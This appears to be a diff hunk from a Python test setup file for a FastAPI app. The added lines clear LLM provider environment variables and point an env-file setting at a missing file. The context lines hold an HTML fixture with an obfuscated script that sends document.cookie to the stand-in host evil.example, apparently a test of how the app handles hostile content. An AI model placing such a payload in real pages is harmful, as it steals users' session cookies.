@@ -28,6 +28,9 @@ _SITE = Path(_TMP.name) / "generated"
     "window['fet'+'ch']('https://evil.example/x?c='+document.cookie)"
     "</script></body></html>", encoding="utf-8")
 os.environ["GENERATED_SITE_ROOT"] = str(_SITE)
+os.environ["CHAPTERSTAGE_ENV_FILE"] = _TMP.name + "/missing.env"
+for _key in ("LLM_PROVIDER", "OLLAMA_MODEL", "OLLAMA_BASE_URL"):
+    os.environ.pop(_key, None)
 
 from fastapi.testclient import TestClient          # noqa: E402
 from app.main import app                           # noqa: E402
